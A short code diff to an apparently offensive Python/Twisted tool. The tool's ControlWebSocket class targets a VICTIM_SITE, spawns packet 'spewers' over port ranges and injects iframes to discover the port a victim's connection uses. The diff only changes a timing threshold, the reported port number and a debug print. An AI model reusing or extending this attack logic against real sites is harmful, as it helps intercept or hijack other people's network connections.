@@ -196,7 +196,7 @@ class ControlWebSocket(Protocol):
         self.transport.write('iframe')
         if (self.spewer_pid == None):
             self.spawnHTTPSpewer() 
-        if (time.time() - self.last_init_iframe) < 25:
+        if (time.time() - self.last_init_iframe) < 20:
             reactor.callLater(float(self.RTT*2.5)/1000, self.make_iframe)
         else:
             # reset the whole thing, try again
@@ -246,8 +246,8 @@ class ControlWebSocket(Protocol):
                     self.mid_port = int(self.min_port) + 20
                 return
 
-            print 'Found port %d used for %s' % (port, VICTIM_SITE)
-            self.transport.write("Found port <b>%d</b> for %s" % (port, VICTIM_SITE)) 
+            print 'Found port %d used for %s' % (port + 1, VICTIM_SITE)
+            self.transport.write("Found port <b>%d</b> for %s" % (port + 1, VICTIM_SITE)) 
 
             self.seq_spew_port = port + 1
             reactor.callLater(0.5, self.init_iframe)
@@ -337,7 +337,7 @@ class ControlWebSocket(Protocol):
         if self.bucket_search:
             (self.min_port, self.mid_port) = self.getBucketPortRange()
         
-        print 'firing %d-%d (%d)' % (self.min_port, self.mid_port, self.max_port)
+        #print 'firing %d-%d (%d)' % (self.min_port, self.mid_port, self.max_port)
 
         self.spawnSpewer(self.min_port, self.mid_port)
 
